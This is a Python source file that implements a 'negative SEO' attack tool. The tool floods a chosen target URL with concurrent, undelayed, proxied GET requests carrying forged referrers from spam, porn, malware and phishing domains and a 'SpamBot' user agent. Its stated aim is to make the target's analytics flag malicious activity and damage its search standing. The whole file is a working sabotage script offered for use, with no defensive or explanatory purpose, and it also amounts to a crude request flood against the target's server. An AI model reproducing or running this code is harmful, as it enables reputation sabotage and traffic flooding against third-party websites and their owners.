import asyncio
import aiohttp
import logging
import random
from typing import List, Optional

class NegativeSignalInjection:
    """
    Negative SEO: Traffic Signal Injection.
    Floods the target's analytics with malicious referrer signals from 
    blacklisted domains to trigger "unusual/malicious activity" flags.
    """
    def __init__(self, target_url: str, proxies: Optional[List[str]] = None):
        self.target_url = target_url
        self.proxies = proxies or []
        self.logger = logging.getLogger("NegativeSignal")
        
        # Blacklisted or low-reputation referrers
        self.bad_referrers = [
            "http://cheap-viagra-store.biz", "http://free-porn-hd.xyz",
            "http://malware-distributor.ru", "http://scam-giveaway.co",
            "http://gambling-bot-net.top", "http://phishing-central.info"
        ]

    async def _inject_signal(self, session: aiohttp.ClientSession):
        headers = {
            "Referer": random.choice(self.bad_referrers),
            "User-Agent": f"SpamBot/{random.randint(1, 9)}.{random.randint(0, 9)}"
        }
        
        proxy = random.choice(self.proxies) if self.proxies else None
        try:
            # High-volume GET requests with malicious referrers
            async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=5) as resp:
                return resp.status < 500
        except:
            return True

    async def run(self, duration: int, threads: int = 50):
        self.logger.info(f"[*] Starting Negative Signal Injection on {self.target_url}")
        
        async with aiohttp.ClientSession() as session:
            start_time = asyncio.get_event_loop().time()
            count = 0
            
            while asyncio.get_event_loop().time() - start_time < duration:
                tasks = [self._inject_signal(session) for _ in range(threads)]
                results = await asyncio.gather(*tasks)
                count += sum(1 for r in results if r)
                # No delay to maximize signal flooding
                
            self.logger.info(f"[+] Signal Injection completed. {count} malicious signals injected.")
            return count
